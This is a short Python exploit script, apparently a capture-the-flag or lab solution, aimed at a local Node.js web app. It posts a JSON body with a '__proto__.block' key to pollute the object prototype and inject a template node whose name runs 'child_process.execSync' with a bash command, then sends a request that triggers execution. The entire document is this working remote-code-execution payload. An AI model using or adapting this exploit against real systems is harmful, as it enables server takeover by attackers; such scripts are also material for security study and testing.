import requests

TARGET_URL = 'http://localhost:1337'

# make pollution
r = requests.post(TARGET_URL + '/', json = {
    "__proto__.block": {
        "type": "Text", 
        "name": "process.mainModule.require('child_process').execSync(`bash -c 'ls'`)"
    }
})

# execute
requests.get(TARGET_URL)

print(r.text)